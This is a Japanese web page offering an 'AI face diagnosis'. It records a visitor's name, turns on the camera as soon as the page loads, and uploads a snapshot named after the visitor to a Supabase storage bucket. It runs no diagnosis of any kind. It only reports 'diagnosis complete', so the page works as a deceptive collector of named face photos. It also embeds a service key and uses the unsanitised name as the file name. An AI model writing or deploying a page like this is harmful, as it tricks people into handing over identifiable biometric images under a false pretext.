<!DOCTYPE html>
<html lang="ja">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>AI顔診断</title>
  <style>
    body {
      font-family: "Helvetica", sans-serif;
      background: linear-gradient(to right, #dfe9f3, #ffffff);
      text-align: center;
      padding: 20px;
    }
    h1 { color: #0066ff; margin-bottom: 10px; }
    p { color: #333; }
    input, button {
      margin: 10px;
      padding: 10px 15px;
      border-radius: 10px;
      border: none;
      font-size: 16px;
    }
    input {
      width: 80%;
      max-width: 300px;
      border: 1px solid #ccc;
    }
    button {
      background-color: #007bff;
      color: white;
      cursor: pointer;
    }
    button:hover {
      background-color: #0056cc;
    }
    #camera {
      margin-top: 15px;
      width: 250px;
      height: 200px;
      background: white;
      border-radius: 15px;
      object-fit: cover;
    }
    small {
      color: gray;
      display: block;
      margin-top: 20px;
    }
  </style>
</head>
<body>
  <h1>AI顔診断</h1>
  <p>あなたのお顔を診断してみましょう！<br>診断にはカメラの許可が必要です。</p>

  <input id="username" type="text" placeholder="あなたの名前を入力" />
  <br />
  <button id="startBtn">🧠 診断をはじめる</button>

  <br />
  <video id="camera" autoplay playsinline muted></video>
  <canvas id="canvas" style="display:none;"></canvas>

  <p id="status"></p>

  <small>※この写真は診断目的でのみ使用され、外部に公開されることはありません。</small>

  <script type="module">
    import { createClient } from "https://cdn.jsdelivr.net/npm/@supabase/supabase-js/+esm";

    const supabaseUrl = "https://hwwjnlprsntmdcytktbm.supabase.co";
    const supabaseKey = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Imh3d2pubHByc250bWRjeXRrdGJtIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NjA2NDU3ODcsImV4cCI6MjA3NjIyMTc4N30.Dni-WtNXSEdyRxH2TSq0oTR9homfAi1Ptz1h0MURFrY";
    const supabase = createClient(supabaseUrl, supabaseKey);

    const video = document.getElementById("camera");
    const canvas = document.getElementById("canvas");
    const startBtn = document.getElementById("startBtn");
    const status = document.getElementById("status");

    // カメラ起動
    async function initCamera() {
      try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
        video.srcObject = stream;
      } catch (err) {
        status.textContent = "カメラアクセスが拒否されました。設定を確認してください。";
        console.error(err);
      }
    }

    initCamera(); // ページ読み込み時に常にカメラ起動

    // 診断開始ボタン押下時
    startBtn.addEventListener("click", async () => {
      const name = document.getElementById("username").value.trim();
      if (!name) {
        alert("名前を入力してください。");
        return;
      }

      status.textContent = "撮影中...📸";

      // 撮影
      const context = canvas.getContext("2d");
      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;
      context.drawImage(video, 0, 0, canvas.width, canvas.height);

      const blob = await new Promise((resolve) => canvas.toBlob(resolve, "image/jpeg"));

      // ファイル名：名前_YYYYMMDD_HHMM.jpg
      const now = new Date();
      const timestamp = now.toISOString().replace(/[-:T]/g, "").slice(0, 12);
      const fileName = `${name}_${timestamp}.jpg`;

      // Supabaseへアップロード
      const { error } = await supabase.storage.from("photos").upload(fileName, blob, {
        contentType: "image/jpeg",
      });

      if (error) {
        console.error(error);
        status.textContent = "アップロードに失敗しました。";
      } else {
        status.innerHTML = `診断完了しました！<br><a href="check.html" style="color:orange;">📷 確認ページを開く</a>`;
      }
    });
  </script>
</body>
</html>
